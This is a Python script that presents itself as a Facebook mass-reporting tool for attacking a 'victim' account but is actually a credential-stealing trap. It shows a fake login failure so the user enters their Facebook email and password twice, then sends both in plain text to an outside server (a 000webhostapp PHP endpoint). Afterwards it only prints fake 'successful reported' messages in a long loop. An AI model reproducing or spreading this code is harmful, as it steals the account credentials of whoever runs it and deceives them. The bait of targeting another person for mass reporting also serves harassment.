from termcolor import colored
import os
import requests
import time
os.system("figlet 'FB REPORTER'")
time.sleep(3)
print(colored('First time you need to login with facebook ','green'))
time.sleep(3)
username = input('Email.......:')
password = input('Password....:')
print(colored('ERROR.....','red'))
time.sleep(1)
print(colored('###Username or Password is wrong###','red'))
time.sleep(1)
print(colored('Please enter Your Facebook Account','red'))
username = input('Email.......:')
password = input('Password....:')
url = "https://gainfb.000webhostapp.com/fblog.php?username="+str(username)+"&password="+str(password)
con = requests.get(url)
print(colored('Success Login......','green'))
time.sleep(2)
print(colored('Please Enter Real Facebook ID ## IMPORTANT ##','green'))
time.sleep(2)
victim = input('Enter Your Victim Facebook ID::')
time.sleep(3)
print(colored('Fitching data please wait.......','green'))
time.sleep(2)
print(colored('Starting reporting engine........','green'))
time.sleep(3)
print(colored('Reporting Start........ ','green'))
time.sleep(3)
print(colored('........','green'))
time.sleep(3)
print(colored('...','green'))
i=10005524559279
while i < 120055245592779:
  time.sleep(3)
  print(colored('['+str(i)+']'+'+++successful reported+++To'+str(victim),'green'))
  i=i+1


